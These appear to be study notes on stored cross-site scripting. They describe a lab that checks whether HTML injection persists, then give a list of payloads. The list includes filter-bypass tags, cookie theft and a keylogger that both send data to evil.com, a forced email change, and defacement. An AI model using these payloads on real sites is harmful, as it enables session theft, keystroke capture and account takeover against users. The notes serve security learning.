### **Stored XSS : Script is stored on server (comments, profiles, forums)**

#### Lab -- XSS 0x02

-  For this lab, since its stored based, i will use **Firefox Mutliple Account Container**, so that i can open the lab from 2 separate acc's, so that it can simulate accounts belonging to 2 individuals.

- ![[showing 2 seperate acc containers..png]]

-  Now we have to Check if the XSS is Stored Based we have to perform `HTML INJECTION` .

-  To check that : 
	-  Goto XSS 0x02 in the 2 acc container, and type `<h1>Testing if HTML INJECTION IS WORKING</h1>` and submit. and reload the page and check  if it is present, if yes, then you have Stored XSS Vulnerably.
	-  In the below image, you can see in Testing acc 2 which is the `green-colored-tab (second tab)` after reloading it is still there.
	-  ![[stored xxs lab 1.png]]
	-  To verify if  it is really happening, we can refresh the site which on a different acc container `blue-colored-tav (first tab)`.
	- ![[stored xss lab 2.png]]
### **Stored XSS Simple Payloads :**

-  **Basic Test ( Comments/Forms ) :**

```text
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

-  **Image Tag ( Bypass Filters ) :**

```text
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
```

-  **SVG Tag (Modern bypass) :**

```text
<svg onload=alert(1)>
<svg/onload=alert(1)>
```

-  **Cookie Theft (Real attack) :**

```text
<script>fetch('http://evil.com?c='+document.cookie)</script>
<img src=x onerror="location.href='http://evil.com?c='+document.cookie">
<script>alert(document.cookie)</script>
```

- **Keylogger :**

```text
<script>document.onkeypress=function(e){fetch('http://evil.com?k='+e.key)}</script>
```

- **Session Hijack :**

```text
<script>fetch('/changeEmail?email=hacker@evil.com')</script>
```

- **Profile/Name Fields :**

```text
" onmouseover=alert(1) 
admin<script>alert(1)</script>
```

- **File Upload (SVG) :**

```text
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

- **Persistent Defacement :**

```text
<script>document.body.innerHTML='HACKED'</script>
```